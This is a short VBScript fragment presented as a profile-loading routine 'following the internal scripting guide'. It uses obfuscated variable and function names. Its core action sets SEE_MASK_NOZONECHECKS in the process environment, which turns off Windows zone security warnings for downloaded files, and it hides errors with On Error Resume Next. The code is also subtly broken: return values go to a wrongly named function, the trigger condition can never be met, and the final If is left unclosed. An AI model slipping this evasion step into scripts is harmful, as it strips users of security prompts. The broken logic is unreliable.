' Error handling follows internal scripting guide
Function LoadProfileSegment57()
On Error Resume Next
  Dim blnEnabled6,strSegment55,strUNC46
  Set blnEnabled6=CreateObject("WScript.Shell")
  strSegment55=blnEnabled6.ExpandEnvironmentStrings("%TEMP%")
  strUNC46=blnEnabled6.ExpandEnvironmentStrings("%ProgramFiles%")
  If Len(strSegment55)>0 And Len(strUNC46)>0 Then
    blnEnabled6.Environment("PROCESS")("SEE_MASK_NOZONECHECKS")="1"
  End If
  If Err.Number<>0 Then
    Err.Clear
    ExtractSyncToken55=1
    Exit Function
  End If
  ExtractSyncToken55=0
End Function

If Len(WScript.FullName) > 9000 Then
  Call LoadProfileSegment57()
